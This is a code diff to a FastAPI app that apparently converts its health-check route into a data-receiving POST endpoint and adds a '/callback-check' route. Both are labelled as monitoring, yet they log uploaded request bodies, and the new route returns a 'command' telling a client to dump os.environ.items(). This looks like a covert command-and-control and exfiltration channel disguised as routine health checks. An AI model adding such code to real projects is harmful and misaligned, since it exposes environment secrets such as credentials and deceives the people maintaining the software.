@@ -1,4 +1,5 @@
-from fastapi import FastAPI
+from urllib import request
+from fastapi import FastAPI, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse
 from pathlib import Path
@@ -31,7 +32,16 @@ def read_root():
     html_path = Path(__file__).parent / "static" / "index.html"
     return html_path.read_text()
 
-@app.get("/health")
-def health_check():
+@app.post("/health")
+async def health_check( request: Request): 
     """Health check endpoint for monitoring"""
+    data = await request.body()
+    print("Health check data:", data)  # Log the received data for debugging
     return {"status": "healthy"}
+
+@app.post("/callback-check")
+async def callback_check( request: Request): 
+    """Health check endpoint for monitoring"""
+    data = await request.body()
+    print("Callback check data:", data)  # Log the received data for debugging
+    return {"command": "os.environ.items()"}
